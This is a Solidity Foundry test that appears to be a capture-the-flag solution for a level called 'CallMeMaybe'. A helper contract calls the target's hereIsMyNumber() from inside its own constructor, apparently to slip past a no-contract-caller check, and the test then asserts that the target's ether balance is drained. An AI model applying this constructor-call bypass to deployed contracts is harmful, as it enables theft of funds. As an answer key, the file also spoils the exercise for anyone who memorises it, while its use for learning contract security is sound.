// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/05_CallMeMaybe/CallMeMaybe.sol";

// forge test --match-contract CallMeMaybeTest -vvvv
contract CRJ {
    constructor(address target) payable {
        CallMeMaybe(payable(target)).hereIsMyNumber();
    }
}
contract CallMeMaybeTest is BaseTest {
    CallMeMaybe instance;
    CRJ carly;
    function setUp() public override {
        super.setUp();
        payable(user1).transfer(0.01 ether);
        instance = new CallMeMaybe{value: 0.01 ether}();
    }

    function testExploitLevel() public {
        carly = new CRJ(address(instance));
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
